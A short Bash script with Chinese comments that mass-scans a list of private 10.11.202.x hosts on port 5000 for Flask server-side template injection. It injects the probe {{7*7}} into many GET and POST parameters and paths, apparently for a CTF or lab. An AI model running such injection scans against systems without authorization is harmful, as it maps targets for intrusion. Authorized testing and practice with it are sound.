#!/usr/bin/env bash
# 自动化 Flask SSTI 探测器 (GET + POST 双模式)

targets=(
10.11.202.5
10.11.202.6
10.11.202.7
10.11.202.9
10.11.202.10
10.11.202.11
10.11.202.13
10.11.202.14
10.11.202.15
10.11.202.16
)

paths=("/" "/search" "/hello" "/index" "/user" "/msg" "/flag" "/test")
params=("name" "user" "msg" "q" "text" "input" "value")

echo "🔍 开始自动化 Flask SSTI 探测 (GET + POST)..."

for ip in "${targets[@]}"; do
  echo "============================"
  echo "📡 正在测试目标: $ip"
  hit=0

  # GET 探测
  for path in "${paths[@]}"; do
    for param in "${params[@]}"; do
      url="http://$ip:5000$path?$param={{7*7}}"
      resp=$(curl -s -m 3 "$url")
      if echo "$resp" | grep -q "49"; then
        echo "🎯 [GET] 发现可能存在 SSTI 漏洞: $url"
        hit=1
      fi
    done
  done

  # POST 探测
  for path in "${paths[@]}"; do
    for param in "${params[@]}"; do
      url="http://$ip:5000$path"
      data="$param={{7*7}}"
      resp=$(curl -s -m 3 -X POST -d "$data" "$url")
      if echo "$resp" | grep -q "49"; then
        echo "🎯 [POST] 发现可能存在 SSTI 漏洞: $url (param=$param)"
        hit=1
      fi
    done
  done

  if [[ $hit -eq 0 ]]; then
    echo "ℹ️  未在 $ip 检测到明显模板注入 (可能参数不同或需复杂 payload)"
  fi
done
